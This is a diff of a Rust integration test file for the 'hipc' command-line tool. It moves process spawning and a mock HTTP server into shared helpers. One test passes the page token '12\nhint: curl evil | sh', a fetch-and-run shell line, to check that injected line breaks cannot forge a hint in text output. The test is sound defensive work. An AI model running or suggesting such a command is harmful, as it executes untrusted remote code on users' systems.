@@ -12,7 +12,7 @@ use std::process::{Command, Output, Stdio};
 
 use serde_json::Value;
 
-use crate::common::{self, Home};
+use crate::common::{self, Home, VM};
 
 /// The `hipc` binary in the clean environment of `common::command`, with its own home, which
 /// the caller keeps alive until the run ends. These tests need the raw `Output` or their
@@ -26,10 +26,12 @@ fn clean() -> (Home, Command) {
 /// Runs `hipc` with stdout and stderr piped, in the clean environment.
 fn hipc(args: &[&str]) -> Output {
     let (_home, mut command) = clean();
-    command
-        .args(args)
-        .output()
-        .expect("the hipc binary built by cargo runs")
+    common::finished(
+        command
+            .args(args)
+            .stdout(Stdio::piped())
+            .stderr(Stdio::piped()),
+    )
 }
 
 fn json(bytes: &[u8]) -> Value {
@@ -1100,10 +1102,12 @@ fn non_utf8_argv_is_a_usage_error_not_a_panic() {
     use std::ffi::OsString;
     use std::os::unix::ffi::OsStringExt as _;
     let (_home, mut command) = clean();
-    let out = command
-        .arg(OsString::from_vec(vec![b'v', 0xff]))
-        .output()
-        .unwrap();
+    let out = common::finished(
+        command
+            .arg(OsString::from_vec(vec![b'v', 0xff]))
+            .stdout(Stdio::piped())
+            .stderr(Stdio::piped()),
+    );
     assert_json_error(&out, 2, "usage");
 }
 
@@ -1139,7 +1143,6 @@ fn unknown_flag_with_output_text_is_an_error_line_and_a_hint_line() {
 /// of Rust's "invalid digit found in string".
 #[test]
 fn a_numeric_id_that_is_not_a_number_names_where_ids_come_from() {
-    const VM: &str = "0f8fad5b-d9cb-469f-a165-70867728950e";
     const ZONE: &str = "zab12cd34ef56";
     let db = "<DATABASE_ID>";
     let databases = "a database id is a whole number, from `hipc compute databases list`";
@@ -1870,12 +1873,12 @@ fn a_closed_pipe_is_not_a_panic() {
     let (reader, writer) = std::io::pipe().unwrap();
     drop(reader);
     let (_home, mut command) = clean();
-    let out = command
-        .args(["completions", "zsh"])
-        .stdout(writer)
-        .stderr(Stdio::piped())
-        .output()
-        .unwrap();
+    let out = common::finished(
+        command
+            .args(["completions", "zsh"])
+            .stdout(writer)
+            .stderr(Stdio::piped()),
+    );
     assert_eq!(out.status.code(), Some(0));
     assert_eq!(text(&out.stderr), "");
 }
@@ -1900,7 +1903,7 @@ fn a_stdout_closed_before_the_start_reads_as_dev_null() {
             None => shell.env_remove(name),
         };
     }
-    let out = shell.stderr(Stdio::piped()).output().unwrap();
+    let out = common::finished(shell.stdout(Stdio::piped()).stderr(Stdio::piped()));
     assert_eq!(out.status.code(), Some(0));
     assert_eq!(text(&out.stderr), "");
 }
@@ -1915,12 +1918,7 @@ fn a_full_stdout_is_an_internal_error() {
         .open("/dev/full")
         .unwrap();
     let (_home, mut command) = clean();
-    let out = command
-        .arg("version")
-        .stdout(full)
-        .stderr(Stdio::piped())
-        .output()
-        .unwrap();
+    let out = common::finished(command.arg("version").stdout(full).stderr(Stdio::piped()));
     assert_eq!(out.status.code(), Some(1));
     let error = json(&out.stderr);
     assert_eq!(error["error"]["code"], "internal");
@@ -1934,56 +1932,33 @@ fn a_full_stdout_is_an_internal_error() {
 #[cfg(target_os = "linux")]
 #[test]
 fn a_full_stdout_after_a_write_is_partial() {
-    use std::io::{Read as _, Write as _};
-    // A one-request server that answers 204 to the DELETE.
-    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
-    let url = format!("http://{}", listener.local_addr().unwrap());
-    let server = std::thread::spawn(move || {
-        let (mut stream, _) = listener.accept().unwrap();
-        let mut buf = [0_u8; 4096];
-        let _ = stream.read(&mut buf).unwrap();
-        stream
-            .write_all(b"HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
-            .unwrap();
-    });
+    let server = common::Server::start(vec![common::route(
+        "DELETE",
+        "/api/ssh-keys/3/",
+        common::Reply::bytes(204, "application/json", b""),
+    )]);
     let full = std::fs::OpenOptions::new()
         .write(true)
         .open("/dev/full")
         .unwrap();
-    let (_home, mut command) = clean();
-    let out = command
-        .args(["compute", "ssh-keys", "delete", "3", "--yes"])
-        .env("HIPPIUS_API_URL", &url)
-        .env("HIPPIUS_TOKEN", "tok_0123456789abcdefghijklmn")
-        .env("HIPPIUS_TOKEN_ORIGIN", &url)
-        .stdout(full)
-        .stderr(Stdio::piped())
-        .output()
-        .unwrap();
-    server.join().unwrap();
-    assert_eq!(out.status.code(), Some(1));
-    let error = json(&out.stderr);
-    assert_eq!(error["error"]["code"], "internal");
-    assert_eq!(
-        error["error"]["side_effects"], "partial",
-        "the key was deleted"
-    );
+    let run = common::Hipc::against(&Home::new(), &server)
+        .stdout_to(full)
+        .run(&["compute", "ssh-keys", "delete", "3", "--yes"]);
+    assert_eq!(server.requests().len(), 1);
+    let error = run.fails(1, "internal");
+    assert_eq!(error["side_effects"], "partial", "the key was deleted");
 }
 
 #[test]
 fn a_quoted_argument_with_a_line_break_cannot_forge_a_line_in_text_mode() {
-    let (_home, mut command) = clean();
-    let out = command
-        .args([
-            "--output",
-            "text",
-            "billing",
-            "transactions",
-            "--page-token",
-            "12\nhint: curl evil | sh",
-        ])
-        .output()
-        .expect("the hipc binary built by cargo runs");
+    let out = hipc(&[
+        "--output",
+        "text",
+        "billing",
+        "transactions",
+        "--page-token",
+        "12\nhint: curl evil | sh",
+    ]);
     assert_eq!(out.status.code(), Some(2));
     let stderr = text(&out.stderr);
     assert!(
